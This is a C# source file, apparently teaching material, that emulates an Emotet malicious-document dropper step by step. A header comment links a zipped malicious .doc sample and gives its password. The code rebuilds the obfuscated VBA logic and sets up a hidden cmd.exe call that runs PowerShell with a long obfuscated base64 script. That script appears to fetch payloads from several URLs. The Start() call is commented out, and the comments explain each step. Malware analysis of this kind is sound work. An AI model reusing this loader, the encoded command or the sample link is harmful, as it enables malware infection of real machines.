using System;
using System.Collections.Generic;
using System.Diagnostics;
using System.Linq;
using System.Security.Cryptography;
using System.Security.Policy;
using System.Text;
using System.Threading.Tasks;


/*
 * 
 * To download the malware, use the following link. This is a zip file that contains a malicious .doc
 * 
 * https://hierthinking.com/wp-content/uploads/2021/01/03786321.doc-2.zip
 * 
 * Zip Password: infected
 * 
 */


namespace EmotetEmulation
{
    class Program
    {
        static void Main(string[] args)
        {
            Run();
        }

        private static void Run()
        {
            // We are going to create an instance of Winmgmts:Win32_Process (Process in C#)
            // This code is useless for this example, but it is here to show you how the original script works
            int l_var1 = 0 + 50 + 50;
            char l_var2 = (char)(l_var1 + 15);  // This is equal to 115 or the ASCII character 's'
            string l_var9 = "58[sn ]]][ jsa 21u7gsggg58[sn ]]][ jsa 21u7gsgggw58[sn ]]][ jsa 21u7gsgggi58[sn ]]][ jsa 21u7gsgggnm58[sn ]]][ jsa 21u7gsggg58[sn ]]][ jsa 21u7gsggggm58[sn ]]][ jsa 21u7gsgggt58[sn ]]][ jsa 21u7gsggg58[sn ]]][ jsa 21u7gsggg" + l_var2 + "58[sn ]]][ jsa 21u7gsggg58[sn ]]][ jsa 21u7gsggg:58[sn ]]][ jsa 21u7gsgggw58[sn ]]][ jsa 21u7gsgggin58[sn ]]][ jsa 21u7gsggg58[sn ]]][ jsa 21u7gsggg358[sn ]]][ jsa 21u7gsggg258[sn ]]][ jsa 21u7gsggg_58[sn ]]][ jsa 21u7gsggg" + "P" + "58[sn ]]][ jsa 21u7gsgggro58[sn ]]][ jsa 21u7gsggg58[sn ]]][ jsa 21u7gsgggce58[sn ]]][ jsa 21u7gsgggs58[sn ]]][ jsa 21u7gsgggs58[sn ]]][ jsa 21u7gsggg";
            string l_var3 = Func3(l_var9);

            // The above code will boil down the string stored in l_var9 to "winmgmts:Win32_Process"
            // In a VBA script this just creates an object that allows us to start a new process on
            // the computer. We do not need this in C# so we will just use "new Process();" instead
            // of passing l_var3 to the CreateObject() function.

            // Original code below
            // var l_var4 = CreateObject(l_var3)

            // The above code converted to C#
            var l_var4 = new Process();



            // The next three lines add onto the string "winmgmts:Win32_Process"
            // After the next three lines execute we will have the following string
            // "winmgmts:Win32_ProcessStartup"
            // Again... this is not used in C# so it is here for the purpose of completeness
            string l_var5 = "tu";
            string l_var6 = (l_var3 + l_var2 + "tar" + l_var5);
            string l_var7 = l_var6 + "p";


            // Create an instance of Winmgmts:Win32_ProcessStartUp (ProcessStartInfo in C#) and set showWindow to false
            // Store the result in l_var8 so that we can then pass that to the Process we created above

            // Original code below
            // var l_var8 = Func2(l_var7);

            // Because we no longer need to rely on the string to create an instance of an object, we have just put the code for creating
            // the ProcessStartInfo object into Func2 and return the instance which is stored in l_var8
            var l_var8 = Func2();


            // Below is the original code. It is meant as an obfuscation technique. The only code that matters here is 
            // l_var4._Create(Func4(), Di7kp444ma7x, l_var8)
            // Which is recreated below in C#
            
            // Original code below
            // var J6e_mh1uf6sgo = Array(Jyavf690bfuck + "Lbnmm6yd32cp3hkxo1 Cb1c620np50qk83ddE6uzj8js1d2yo3 Gg82_svnrij4l4s_d", l_var4._Create(Func4(), Di7kp444ma7x, l_var8), Lhwb17nd_uscq_e0 + "Fdxsit003e9hfvr5 Vv124e2cgyoh04 Vx44ajhyxd93q85_ G0ftj0p_8pc")

            // The above code converted to C#
            l_var4.StartInfo = l_var8;

            // We would normally call l_var4.Start() to run the command, but we don't want to do that to ourselves.
            // So that is commented out below.

            //l_var4.Start();
        }

        private static ProcessStartInfo Func2()
        {
            // In the original VBA script we passed in a string that would be used to create an instance of
            // the object that stored information about the process we eventually want to start. 
            // Below is the C# equivalent. We do not need to rely on the string anymore so it was not passed in.
            var psi = new ProcessStartInfo();

            // We do not want to create a new window... The user would then be tipped off that something was executing and
            // we want to avoid that (since we are evil)
            psi.CreateNoWindow = true;

            // Set some other options that are not set in the original script
            // This sets the process we want to start, and the command which we will get from Func4()
            psi.FileName = "C:\\Windows\\System32\\cmd.exe";
            psi.UseShellExecute = false;
            psi.Arguments = "/C " + Func4();

            return psi;
        }

        private static string Func3(string obfuscatedCommand)
        {
            // We will take the input into this funtion and use .Split to break the string up into different parts. We are going to
            // split the string by "58[sn ]]][ jsa 21u7gsggg". By doing this, we are removing every instance of "58[sn ]]][ jsa 21u7gsggg"
            // from the output, which leaves us with an array that contians all the characters in the input string that are not part of 
            // the "58[sn ]]][ jsa 21u7gsggg" pattern
            string l_var1 = obfuscatedCommand;
            var split_l_var1 = l_var1.Split(new[] { "58[sn ]]][ jsa 21u7gsggg" }, StringSplitOptions.None);


            // Now we will take the array with all our left over characters and put it back together into a single string and return it.
            var l_var2 = string.Join("", split_l_var1);
            return l_var2;
        }

        private static string Func4()
        {
            // Input the following string into Func3 and return the result of Func3

            // The below code will result in a string that calls the PowerShell process and a base64 encoded PowerShell Script
            var l_var1 = "p58[sn ]]][ jsa 21u7gsgggo58[sn ]]][ jsa 21u7gsgggw58[sn ]]][ jsa 21u7gsggge58[sn ]]][ jsa 21u7gsgggr58[sn ]]][ jsa 21u7gsgggs58[sn ]]][ jsa 21u7gsgggh58[sn ]]][ jsa 21u7gsgggeL58[sn ]]][ jsa 21u7gsgggL58[sn ]]][ jsa 21u7gsggg 58[sn ]]][ jsa 21u7gsggg-58[sn ]]][ jsa 21u7gsggge58[sn ]]][ jsa 21u7gsggg JABFA58[sn ]]][ jsa 21u7gsgggHQANw58[sn ]]][ jsa 21u7gsgggBrADA58[sn ]]][ jsa 21u7gsgggAegBk58[sn ]]][ jsa 21u7gsgggAD0AK58[sn ]]][ jsa 21u7gsgggAAnAE58[sn ]]][ jsa 21u7gsgggQAJwA58[sn ]]][ jsa 21u7gsgggrACcA58[sn ]]][ jsa 21u7gsgggNgA3A58[sn ]]][ jsa 21u7gsgggHMAaA58[sn ]]][ jsa 21u7gsgggAnACs58[sn ]]][ jsa 21u7gsgggAJwB258[sn ]]][ jsa 21u7gsgggADIAJ58[sn ]]][ jsa 21u7gsgggwApAD58[sn ]]][ jsa 21u7gsgggsAJgA58[sn ]]][ jsa 21u7gsgggoACcA58[sn ]]][ jsa 21u7gsgggbgBlA58[sn ]]][ jsa 21u7gsgggHcALQ58[sn ]]][ jsa 21u7gsgggAnACs58[sn ]]][ jsa 21u7gsgggAJwBp58[sn ]]][ jsa 21u7gsgggAHQAJ58[sn ]]][ jsa 21u7gsgggwArAC58[sn ]]][ jsa 21u7gsgggcAZQB58[sn ]]][ jsa 21u7gsgggtACcA58[sn ]]][ jsa 21u7gsgggKQAgA58[sn ]]][ jsa 21u7gsgggCQARQ58[sn ]]][ jsa 21u7gsgggBOAFY58[sn ]]][ jsa 21u7gsgggAOgBU58[sn ]]][ jsa 21u7gsgggAGUAb58[sn ]]][ jsa 21u7gsgggQBQAF58[sn ]]][ jsa 21u7gsgggwATwB58[sn ]]][ jsa 21u7gsgggGAGYA58[sn ]]][ jsa 21u7gsgggaQBDA58[sn ]]][ jsa 21u7gsgggEUAMg58[sn ]]][ jsa 21u7gsgggAwADE58[sn ]]][ jsa 21u7gsgggAOQAg58[sn ]]][ jsa 21u7gsgggAC0Aa58[sn ]]][ jsa 21u7gsgggQB0AG58[sn ]]][ jsa 21u7gsgggUAbQB58[sn ]]][ jsa 21u7gsggg0AHkA58[sn ]]][ jsa 21u7gsgggcABlA58[sn ]]][ jsa 21u7gsgggCAARA58[sn ]]][ jsa 21u7gsgggBpAFI58[sn ]]][ jsa 21u7gsgggARQBj58[sn ]]][ jsa 21u7gsgggAFQAb58[sn ]]][ jsa 21u7gsgggwBSAF58[sn ]]][ jsa 21u7gsgggkAOwB58[sn ]]][ jsa 21u7gsgggbAE4A58[sn ]]][ jsa 21u7gsgggZQB0A58[sn ]]][ jsa 21u7gsgggC4AUw58[sn ]]][ jsa 21u7gsgggBlAHI58[sn ]]][ jsa 21u7gsgggAdgBp58[sn ]]][ jsa 21u7gsgggAGMAZ58[sn ]]][ jsa 21u7gsgggQBQAG58[sn ]]][ jsa 21u7gsggg8AaQB58[sn ]]][ jsa 21u7gsggguAHQA58[sn ]]][ jsa 21u7gsgggTQBhA58[sn ]]][ jsa 21u7gsgggG4AYQ58[sn ]]][ jsa 21u7gsgggBnAGU58[sn ]]][ jsa 21u7gsgggAcgBd58[sn ]]][ jsa 21u7gsgggADoAO58[sn ]]][ jsa 21u7gsggggAiAF58[sn ]]][ jsa 21u7gsgggMARQB58[sn ]]][ jsa 21u7gsggggAGMA58[sn ]]][ jsa 21u7gsgggdQBSA58[sn ]]][ jsa 21u7gsgggGkAVA58[sn ]]][ jsa 21u7gsgggB5AHA58[sn ]]][ jsa 21u7gsgggAcgBv58[sn ]]][ jsa 21u7gsgggAFQAY58[sn ]]][ jsa 21u7gsgggABPAG58[sn ]]][ jsa 21u7gsgggMAYAB58[sn ]]][ jsa 21u7gsgggvAGwA58[sn ]]][ jsa 21u7gsgggIgAgA58[sn ]]][ jsa 21u7gsgggD0AIA58[sn ]]][ jsa 21u7gsgggAoACc58[sn ]]][ jsa 21u7gsgggAdABs58[sn ]]][ jsa 21u7gsgggAHMAM58[sn ]]][ jsa 21u7gsgggQAyAC58[sn ]]][ jsa 21u7gsgggwAIAB58[sn ]]][ jsa 21u7gsggg0ACcA58[sn ]]][ jsa 21u7gsgggKwAnA58[sn ]]][ jsa 21u7gsgggGwAcw58[sn ]]][ jsa 21u7gsgggAxACc58[sn ]]][ jsa 21u7gsgggAKwAn58[sn ]]][ jsa 21u7gsgggADEAL58[sn ]]][ jsa 21u7gsgggAAgAH58[sn ]]][ jsa 21u7gsgggQAJwA58[sn ]]][ jsa 21u7gsgggrACcA58[sn ]]][ jsa 21u7gsgggbABzA58[sn ]]][ jsa 21u7gsgggCcAKQ58[sn ]]][ jsa 21u7gsgggA7ACQ58[sn ]]][ jsa 21u7gsgggAVgBu58[sn ]]][ jsa 21u7gsgggAGIAe58[sn ]]][ jsa 21u7gsgggQBhAG58[sn ]]][ jsa 21u7gsggggAeAA58[sn ]]][ jsa 21u7gsggggAD0A58[sn ]]][ jsa 21u7gsgggIAAoA58[sn ]]][ jsa 21u7gsgggCcASQ58[sn ]]][ jsa 21u7gsgggBuACc58[sn ]]][ jsa 21u7gsgggAKwAn58[sn ]]][ jsa 21u7gsgggAHUAZ58[sn ]]][ jsa 21u7gsgggQBkAD58[sn ]]][ jsa 21u7gsgggkAcQA58[sn ]]][ jsa 21u7gsgggnACkA58[sn ]]][ jsa 21u7gsgggOwAkA58[sn ]]][ jsa 21u7gsgggEsAdQ58[sn ]]][ jsa 21u7gsgggBsAHg58[sn ]]][ jsa 21u7gsgggAXwB058[sn ]]][ jsa 21u7gsgggAHYAP58[sn ]]][ jsa 21u7gsgggQAoAC58[sn ]]][ jsa 21u7gsgggcASwA58[sn ]]][ jsa 21u7gsgggzACcA58[sn ]]][ jsa 21u7gsgggKwAnA58[sn ]]][ jsa 21u7gsgggGcANg58[sn ]]][ jsa 21u7gsgggAyACc58[sn ]]][ jsa 21u7gsgggAKwAn58[sn ]]][ jsa 21u7gsgggAF8Ae58[sn ]]][ jsa 21u7gsggggAnAC58[sn ]]][ jsa 21u7gsgggkAOwA58[sn ]]][ jsa 21u7gsgggkAEUA58[sn ]]][ jsa 21u7gsgggbwA0A58[sn ]]][ jsa 21u7gsgggGcAMQ58[sn ]]][ jsa 21u7gsgggAwAHo58[sn ]]][ jsa 21u7gsgggAPQAk58[sn ]]][ jsa 21u7gsgggAGUAb58[sn ]]][ jsa 21u7gsggggB2AD58[sn ]]][ jsa 21u7gsgggoAdAB58[sn ]]][ jsa 21u7gsggglAG0A58[sn ]]][ jsa 21u7gsgggcAArA58[sn ]]][ jsa 21u7gsgggCgAKA58[sn ]]][ jsa 21u7gsgggAnAEI58[sn ]]][ jsa 21u7gsgggAcQBN58[sn ]]][ jsa 21u7gsgggACcAK58[sn ]]][ jsa 21u7gsgggwAnAE58[sn ]]][ jsa 21u7gsggg8AZgB58[sn ]]][ jsa 21u7gsgggmAGkA58[sn ]]][ jsa 21u7gsgggJwArA58[sn ]]][ jsa 21u7gsgggCcAYw58[sn ]]][ jsa 21u7gsgggBlADI58[sn ]]][ jsa 21u7gsgggAMAAn58[sn ]]][ jsa 21u7gsgggACsAJ58[sn ]]][ jsa 21u7gsgggwAxAD58[sn ]]][ jsa 21u7gsgggkAQgA58[sn ]]][ jsa 21u7gsgggnACsA58[sn ]]][ jsa 21u7gsgggJwBxA58[sn ]]][ jsa 21u7gsgggE0AJw58[sn ]]][ jsa 21u7gsgggApACA58[sn ]]][ jsa 21u7gsgggAIAAt58[sn ]]][ jsa 21u7gsgggAHIAR58[sn ]]][ jsa 21u7gsgggQBQAG58[sn ]]][ jsa 21u7gsgggwAYQB58[sn ]]][ jsa 21u7gsgggDAGUA58[sn ]]][ jsa 21u7gsgggIAAoA58[sn ]]][ jsa 21u7gsgggFsAYw58[sn ]]][ jsa 21u7gsgggBIAGE58[sn ]]][ jsa 21u7gsgggAUgBd58[sn ]]][ jsa 21u7gsgggADYAN58[sn ]]][ jsa 21u7gsggggArAF58[sn ]]][ jsa 21u7gsgggsAYwB58[sn ]]][ jsa 21u7gsgggIAGEA58[sn ]]][ jsa 21u7gsgggUgBdA58[sn ]]][ jsa 21u7gsgggDEAMQ58[sn ]]][ jsa 21u7gsgggAzACs58[sn ]]][ jsa 21u7gsgggAWwBj58[sn ]]][ jsa 21u7gsgggAEgAY58[sn ]]][ jsa 21u7gsgggQBSAF58[sn ]]][ jsa 21u7gsggg0ANwA58[sn ]]][ jsa 21u7gsggg3ACkA58[sn ]]][ jsa 21u7gsgggLABbA58[sn ]]][ jsa 21u7gsgggGMASA58[sn ]]][ jsa 21u7gsgggBhAFI58[sn ]]][ jsa 21u7gsgggAXQA558[sn ]]][ jsa 21u7gsgggADIAK58[sn ]]][ jsa 21u7gsgggQArAC58[sn ]]][ jsa 21u7gsgggQAVgB58[sn ]]][ jsa 21u7gsggguAGIA58[sn ]]][ jsa 21u7gsgggeQBhA58[sn ]]][ jsa 21u7gsgggGgAeA58[sn ]]][ jsa 21u7gsgggArACg58[sn ]]][ jsa 21u7gsgggAJwAu58[sn ]]][ jsa 21u7gsgggAGUAJ58[sn ]]][ jsa 21u7gsgggwArAC58[sn ]]][ jsa 21u7gsgggcAeAB58[sn ]]][ jsa 21u7gsggglACcA58[sn ]]][ jsa 21u7gsgggKQA7A58[sn ]]][ jsa 21u7gsgggCQASA58[sn ]]][ jsa 21u7gsgggBzAGE58[sn ]]][ jsa 21u7gsgggANwBk58[sn ]]][ jsa 21u7gsgggAGcAN58[sn ]]][ jsa 21u7gsggggA9AC58[sn ]]][ jsa 21u7gsggggAJwB58[sn ]]][ jsa 21u7gsgggRAHcA58[sn ]]][ jsa 21u7gsgggbAB4A58[sn ]]][ jsa 21u7gsgggCcAKw58[sn ]]][ jsa 21u7gsgggAnAHg58[sn ]]][ jsa 21u7gsgggAdAA158[sn ]]][ jsa 21u7gsgggACcAK58[sn ]]][ jsa 21u7gsgggQA7AC58[sn ]]][ jsa 21u7gsgggQAQgB58[sn ]]][ jsa 21u7gsggg3AGEA58[sn ]]][ jsa 21u7gsgggMQBzA58[sn ]]][ jsa 21u7gsgggDgAZA58[sn ]]][ jsa 21u7gsgggA9AC458[sn ]]][ jsa 21u7gsgggAKAAn58[sn ]]][ jsa 21u7gsgggAG4AZ58[sn ]]][ jsa 21u7gsgggQAnAC58[sn ]]][ jsa 21u7gsgggsAJwB58[sn ]]][ jsa 21u7gsggg3AC0A58[sn ]]][ jsa 21u7gsgggbwBiA58[sn ]]][ jsa 21u7gsgggGoAZQ58[sn ]]][ jsa 21u7gsgggBjACc58[sn ]]][ jsa 21u7gsgggAKwAn58[sn ]]][ jsa 21u7gsgggAHQAJ58[sn ]]][ jsa 21u7gsgggwApAC58[sn ]]][ jsa 21u7gsgggAATgB58[sn ]]][ jsa 21u7gsggglAFQA58[sn ]]][ jsa 21u7gsgggLgB3A58[sn ]]][ jsa 21u7gsgggEUAQg58[sn ]]][ jsa 21u7gsgggBjAGw58[sn ]]][ jsa 21u7gsgggASQBl58[sn ]]][ jsa 21u7gsgggAE4Ad58[sn ]]][ jsa 21u7gsgggAA7AC58[sn ]]][ jsa 21u7gsgggQATAB58[sn ]]][ jsa 21u7gsgggkAHcA58[sn ]]][ jsa 21u7gsgggZQBhA58[sn ]]][ jsa 21u7gsgggGEAZw58[sn ]]][ jsa 21u7gsgggA9ACg58[sn ]]][ jsa 21u7gsgggAJwBo58[sn ]]][ jsa 21u7gsgggACcAK58[sn ]]][ jsa 21u7gsgggwAnAH58[sn ]]][ jsa 21u7gsgggQAdAB58[sn ]]][ jsa 21u7gsgggwACcA58[sn ]]][ jsa 21u7gsgggKwAnA58[sn ]]][ jsa 21u7gsgggDoALw58[sn ]]][ jsa 21u7gsgggAvAHQ58[sn ]]][ jsa 21u7gsgggAJwAr58[sn ]]][ jsa 21u7gsgggACcAa58[sn ]]][ jsa 21u7gsgggAAnAC58[sn ]]][ jsa 21u7gsgggsAJwB58[sn ]]][ jsa 21u7gsgggpAGMA58[sn ]]][ jsa 21u7gsgggJwArA58[sn ]]][ jsa 21u7gsgggCcAaA58[sn ]]][ jsa 21u7gsgggAnACs58[sn ]]][ jsa 21u7gsgggAJwBk58[sn ]]][ jsa 21u7gsgggACcAK58[sn ]]][ jsa 21u7gsgggwAnAG58[sn ]]][ jsa 21u7gsgggkAcgA58[sn ]]][ jsa 21u7gsgggnACsA58[sn ]]][ jsa 21u7gsgggJwB1A58[sn ]]][ jsa 21u7gsgggG4AJw58[sn ]]][ jsa 21u7gsgggArACc58[sn ]]][ jsa 21u7gsgggAZwAn58[sn ]]][ jsa 21u7gsgggACsAJ58[sn ]]][ jsa 21u7gsgggwAuAC58[sn ]]][ jsa 21u7gsgggcAKwA58[sn ]]][ jsa 21u7gsgggnAGMA58[sn ]]][ jsa 21u7gsgggbwBtA58[sn ]]][ jsa 21u7gsgggC8AJw58[sn ]]][ jsa 21u7gsgggArACc58[sn ]]][ jsa 21u7gsgggAZAB158[sn ]]][ jsa 21u7gsgggAHAAL58[sn ]]][ jsa 21u7gsgggQBpAG58[sn ]]][ jsa 21u7gsggg4AcwB58[sn ]]][ jsa 21u7gsggg0AGEA58[sn ]]][ jsa 21u7gsgggbABsA58[sn ]]][ jsa 21u7gsgggCcAKw58[sn ]]][ jsa 21u7gsgggAnAGU58[sn ]]][ jsa 21u7gsgggAcgAv58[sn ]]][ jsa 21u7gsgggADYAc58[sn ]]][ jsa 21u7gsgggwAyAC58[sn ]]][ jsa 21u7gsgggcAKwA58[sn ]]][ jsa 21u7gsgggnAHAA58[sn ]]][ jsa 21u7gsgggTgBXA58[sn ]]][ jsa 21u7gsgggCcAKw58[sn ]]][ jsa 21u7gsgggAnAEg58[sn ]]][ jsa 21u7gsgggALwAq58[sn ]]][ jsa 21u7gsgggAGgAd58[sn ]]][ jsa 21u7gsgggAB0AH58[sn ]]][ jsa 21u7gsgggAAOgA58[sn ]]][ jsa 21u7gsgggvAC8A58[sn ]]][ jsa 21u7gsgggcwAnA58[sn ]]][ jsa 21u7gsgggCsAJw58[sn ]]][ jsa 21u7gsgggB1AG458[sn ]]][ jsa 21u7gsgggAZwB258[sn ]]][ jsa 21u7gsgggAGEAb58[sn ]]][ jsa 21u7gsgggABvAH58[sn ]]][ jsa 21u7gsgggAAawB58[sn ]]][ jsa 21u7gsgggoACcA58[sn ]]][ jsa 21u7gsgggKwAnA58[sn ]]][ jsa 21u7gsgggG8AJw58[sn ]]][ jsa 21u7gsgggArACc58[sn ]]][ jsa 21u7gsgggAbgBn58[sn ]]][ jsa 21u7gsgggACcAK58[sn ]]][ jsa 21u7gsgggwAnAH58[sn ]]][ jsa 21u7gsgggMAYQB58[sn ]]][ jsa 21u7gsgggtACcA58[sn ]]][ jsa 21u7gsgggKwAnA58[sn ]]][ jsa 21u7gsgggC4AJw58[sn ]]][ jsa 21u7gsgggArACc58[sn ]]][ jsa 21u7gsgggAYwBv58[sn ]]][ jsa 21u7gsgggAG0AL58[sn ]]][ jsa 21u7gsgggwAnAC58[sn ]]][ jsa 21u7gsgggsAJwB58[sn ]]][ jsa 21u7gsggg0AGUA58[sn ]]][ jsa 21u7gsgggJwArA58[sn ]]][ jsa 21u7gsgggCcAbQ58[sn ]]][ jsa 21u7gsgggBwAC858[sn ]]][ jsa 21u7gsgggAdAA558[sn ]]][ jsa 21u7gsgggACcAK58[sn ]]][ jsa 21u7gsgggwAnAD58[sn ]]][ jsa 21u7gsgggAAJwA58[sn ]]][ jsa 21u7gsgggrACcA58[sn ]]][ jsa 21u7gsgggeQBqA58[sn ]]][ jsa 21u7gsgggCcAKw58[sn ]]][ jsa 21u7gsgggAnAHM58[sn ]]][ jsa 21u7gsgggALwAn58[sn ]]][ jsa 21u7gsgggACsAJ58[sn ]]][ jsa 21u7gsgggwAqAC58[sn ]]][ jsa 21u7gsgggcAKwA58[sn ]]][ jsa 21u7gsgggnAGgA58[sn ]]][ jsa 21u7gsgggdAB0A58[sn ]]][ jsa 21u7gsgggHAAOg58[sn ]]][ jsa 21u7gsgggAnACs58[sn ]]][ jsa 21u7gsgggAJwAv58[sn ]]][ jsa 21u7gsgggACcAK58[sn ]]][ jsa 21u7gsgggwAnAC58[sn ]]][ jsa 21u7gsggg8AZAA58[sn ]]][ jsa 21u7gsgggnACsA58[sn ]]][ jsa 21u7gsgggJwByA58[sn ]]][ jsa 21u7gsgggHMAaA58[sn ]]][ jsa 21u7gsgggBlAGs58[sn ]]][ jsa 21u7gsgggAaAAn58[sn ]]][ jsa 21u7gsgggACsAJ58[sn ]]][ jsa 21u7gsgggwBhAC58[sn ]]][ jsa 21u7gsgggcAKwA58[sn ]]][ jsa 21u7gsgggnAHIA58[sn ]]][ jsa 21u7gsgggYgBpA58[sn ]]][ jsa 21u7gsgggHMAJw58[sn ]]][ jsa 21u7gsgggArACc58[sn ]]][ jsa 21u7gsgggAdwBh58[sn ]]][ jsa 21u7gsgggACcAK58[sn ]]][ jsa 21u7gsgggwAnAH58[sn ]]][ jsa 21u7gsgggMAJwA58[sn ]]][ jsa 21u7gsgggrACcA58[sn ]]][ jsa 21u7gsgggLgBjA58[sn ]]][ jsa 21u7gsgggG8AbQ58[sn ]]][ jsa 21u7gsgggAvAGM58[sn ]]][ jsa 21u7gsgggAZwAn58[sn ]]][ jsa 21u7gsgggACsAJ58[sn ]]][ jsa 21u7gsgggwBpAC58[sn ]]][ jsa 21u7gsggg0AYgB58[sn ]]][ jsa 21u7gsgggpAG4A58[sn ]]][ jsa 21u7gsgggJwArA58[sn ]]][ jsa 21u7gsgggCcALw58[sn ]]][ jsa 21u7gsgggBMAGE58[sn ]]][ jsa 21u7gsgggAJwAr58[sn ]]][ jsa 21u7gsgggACcAM58[sn ]]][ jsa 21u7gsgggQAvAC58[sn ]]][ jsa 21u7gsgggoAJwA58[sn ]]][ jsa 21u7gsgggrACcA58[sn ]]][ jsa 21u7gsgggaAB0A58[sn ]]][ jsa 21u7gsgggHQAcA58[sn ]]][ jsa 21u7gsgggBzACc58[sn ]]][ jsa 21u7gsgggAKwAn58[sn ]]][ jsa 21u7gsgggADoAJ58[sn ]]][ jsa 21u7gsgggwArAC58[sn ]]][ jsa 21u7gsgggcALwA58[sn ]]][ jsa 21u7gsgggvAHcA58[sn ]]][ jsa 21u7gsgggdwAnA58[sn ]]][ jsa 21u7gsgggCsAJw58[sn ]]][ jsa 21u7gsgggB3AC458[sn ]]][ jsa 21u7gsgggAcABy58[sn ]]][ jsa 21u7gsgggACcAK58[sn ]]][ jsa 21u7gsgggwAnAG58[sn ]]][ jsa 21u7gsggg8AJwA58[sn ]]][ jsa 21u7gsgggrACcA58[sn ]]][ jsa 21u7gsgggeQBlA58[sn ]]][ jsa 21u7gsgggGMAdA58[sn ]]][ jsa 21u7gsgggBvACc58[sn ]]][ jsa 21u7gsgggAKwAn58[sn ]]][ jsa 21u7gsgggAGIAJ58[sn ]]][ jsa 21u7gsgggwArAC58[sn ]]][ jsa 21u7gsgggcAYQA58[sn ]]][ jsa 21u7gsgggnACsA58[sn ]]][ jsa 21u7gsgggJwB5A58[sn ]]][ jsa 21u7gsgggGEAJw58[sn ]]][ jsa 21u7gsgggArACc58[sn ]]][ jsa 21u7gsgggAYwB158[sn ]]][ jsa 21u7gsgggAC4AY58[sn ]]][ jsa 21u7gsgggwBvAG58[sn ]]][ jsa 21u7gsggg0ALwB58[sn ]]][ jsa 21u7gsggguACcA58[sn ]]][ jsa 21u7gsgggKwAnA58[sn ]]][ jsa 21u7gsgggG8AdA58[sn ]]][ jsa 21u7gsgggBoAGk58[sn ]]][ jsa 21u7gsgggAbgAn58[sn ]]][ jsa 21u7gsgggACsAJ58[sn ]]][ jsa 21u7gsgggwBnAC58[sn ]]][ jsa 21u7gsggg8AJwA58[sn ]]][ jsa 21u7gsgggrACcA58[sn ]]][ jsa 21u7gsgggNQAvA58[sn ]]][ jsa 21u7gsgggCoAaA58[sn ]]][ jsa 21u7gsgggB0ACc58[sn ]]][ jsa 21u7gsgggAKwAn58[sn ]]][ jsa 21u7gsgggAHQAc58[sn ]]][ jsa 21u7gsgggAA6AC58[sn ]]][ jsa 21u7gsggg8ALwA58[sn ]]][ jsa 21u7gsgggnACsA58[sn ]]][ jsa 21u7gsgggJwBkA58[sn ]]][ jsa 21u7gsgggCcAKw58[sn ]]][ jsa 21u7gsgggAnAGk58[sn ]]][ jsa 21u7gsgggAJwAr58[sn ]]][ jsa 21u7gsgggACcAZ58[sn ]]][ jsa 21u7gsgggwAnAC58[sn ]]][ jsa 21u7gsgggsAJwB58[sn ]]][ jsa 21u7gsgggpAHQA58[sn ]]][ jsa 21u7gsgggYQAnA58[sn ]]][ jsa 21u7gsgggCsAJw58[sn ]]][ jsa 21u7gsgggBsAG058[sn ]]][ jsa 21u7gsgggAYQBy58[sn ]]][ jsa 21u7gsgggAGsAZ58[sn ]]][ jsa 21u7gsgggQAnAC58[sn ]]][ jsa 21u7gsgggsAJwB58[sn ]]][ jsa 21u7gsggg0AGkA58[sn ]]][ jsa 21u7gsgggJwArA58[sn ]]][ jsa 21u7gsgggCcAbg58[sn ]]][ jsa 21u7gsgggBnAGI58[sn ]]][ jsa 21u7gsgggAbABv58[sn ]]][ jsa 21u7gsgggAGcAJ58[sn ]]][ jsa 21u7gsgggwArAC58[sn ]]][ jsa 21u7gsgggcAZwA58[sn ]]][ jsa 21u7gsgggnACsA58[sn ]]][ jsa 21u7gsgggJwBlA58[sn ]]][ jsa 21u7gsgggHIAcw58[sn ]]][ jsa 21u7gsgggAuACc58[sn ]]][ jsa 21u7gsgggAKwAn58[sn ]]][ jsa 21u7gsgggAGMAb58[sn ]]][ jsa 21u7gsgggwAnAC58[sn ]]][ jsa 21u7gsgggsAJwB58[sn ]]][ jsa 21u7gsgggtAC8A58[sn ]]][ jsa 21u7gsgggZQAnA58[sn ]]][ jsa 21u7gsgggCsAJw58[sn ]]][ jsa 21u7gsgggBsACc58[sn ]]][ jsa 21u7gsgggAKwAn58[sn ]]][ jsa 21u7gsgggAGoAd58[sn ]]][ jsa 21u7gsgggQAvAC58[sn ]]][ jsa 21u7gsgggcAKwA58[sn ]]][ jsa 21u7gsgggnAEEA58[sn ]]][ jsa 21u7gsgggbwA1A58[sn ]]][ jsa 21u7gsgggEkASg58[sn ]]][ jsa 21u7gsgggB5AC858[sn ]]][ jsa 21u7gsgggAKgAn58[sn ]]][ jsa 21u7gsgggACsAJ58[sn ]]][ jsa 21u7gsgggwBoAH58[sn ]]][ jsa 21u7gsgggQAJwA58[sn ]]][ jsa 21u7gsgggrACcA58[sn ]]][ jsa 21u7gsgggdAAnA58[sn ]]][ jsa 21u7gsgggCsAJw58[sn ]]][ jsa 21u7gsgggBwADo58[sn ]]][ jsa 21u7gsgggALwAn58[sn ]]][ jsa 21u7gsgggACsAJ58[sn ]]][ jsa 21u7gsgggwAvAH58[sn ]]][ jsa 21u7gsgggIAZQB58[sn ]]][ jsa 21u7gsgggjAHUA58[sn ]]][ jsa 21u7gsgggcABlA58[sn ]]][ jsa 21u7gsgggHIAYQ58[sn ]]][ jsa 21u7gsgggBhACc58[sn ]]][ jsa 21u7gsgggAKwAn58[sn ]]][ jsa 21u7gsgggAHQAd58[sn ]]][ jsa 21u7gsgggQBwAG58[sn ]]][ jsa 21u7gsgggEAcgB58[sn ]]][ jsa 21u7gsggglAGoA58[sn ]]][ jsa 21u7gsgggJwArA58[sn ]]][ jsa 21u7gsgggCcAYQ58[sn ]]][ jsa 21u7gsgggAnACs58[sn ]]][ jsa 21u7gsgggAJwAu58[sn ]]][ jsa 21u7gsgggAGMAJ58[sn ]]][ jsa 21u7gsgggwArAC58[sn ]]][ jsa 21u7gsgggcAbwB58[sn ]]][ jsa 21u7gsgggtACcA58[sn ]]][ jsa 21u7gsgggKwAnA58[sn ]]][ jsa 21u7gsgggC8AJw58[sn ]]][ jsa 21u7gsgggArACc58[sn ]]][ jsa 21u7gsgggAQQBy58[sn ]]][ jsa 21u7gsgggAGMAa58[sn ]]][ jsa 21u7gsgggABpAH58[sn ]]][ jsa 21u7gsgggYAbwB58[sn ]]][ jsa 21u7gsgggzACcA58[sn ]]][ jsa 21u7gsgggKwAnA58[sn ]]][ jsa 21u7gsgggHYAaQ58[sn ]]][ jsa 21u7gsgggBlAGo58[sn ]]][ jsa 21u7gsgggAbwBz58[sn ]]][ jsa 21u7gsgggACcAK58[sn ]]][ jsa 21u7gsgggwAnAC58[sn ]]][ jsa 21u7gsggg8AJwA58[sn ]]][ jsa 21u7gsgggrACcA58[sn ]]][ jsa 21u7gsgggdAB3A58[sn ]]][ jsa 